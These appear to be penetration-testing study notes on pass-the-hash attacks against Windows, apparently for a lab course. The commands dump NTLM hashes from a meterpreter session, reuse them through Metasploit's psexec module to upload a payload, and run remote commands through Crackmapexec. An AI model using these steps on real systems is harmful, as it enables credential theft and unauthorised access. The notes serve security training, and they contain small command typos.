- Pass-the-hash is an exploitation technique that involves ***capturing or harvesting NTLM hashes*** or ***clear-text passwords*** and utilizing them to authenticate with the legitimately.
- We can use multiple tools to facilitate a Pass-The-Hash attack:
	- Metasploit PsExec module
	- `Crackmapexec`
- This technique will allow us to obtain ***access to the target system via legitimate credentials*** as opposed to obtaining access via service exploitation.

***

### Practical

### Using PsExec

Perform the `badblue` exploit using metasploit module from `Dumping Hashes with Mimikatz`.  Once you get a shell:
##### NTLM Hash
```
lsa_dump_sam
```
copy the hash in a new text file. 

##### PsExec Pass the Hash
To perform this attack, we need both LM & NT or NTLM hash. Quick way to get that:
```
hashdump
```

##### Background the current meterpreter session:
```
ctrl+z
```

##### Metasploit PsExec
```
use exploit/windows/smb/psexec  #--> because it says 'Authenticated' 
set rhosts Target
set lport 5555
set smbuser administrator
set smbpass LM&NTLM HASH
set target native\ upload  #--> To upload the meterpreter payload
run
```

Once this exploit is performed, we do not need to perform the attack. We can just use the PsExec module to obtain a session.

***

### `Crackmapexec`
```
crackmapexec smb IP -U Administrator -H "NTLM HASH" 
```

##### Perform Commands on the Target
```
crackmapexec smb IP -U Administrator -H "NTLM HASH" -x "ipconifg"
crackmapexec smb IP -U Administrator -H "NTLM HASH" -x "net user"
```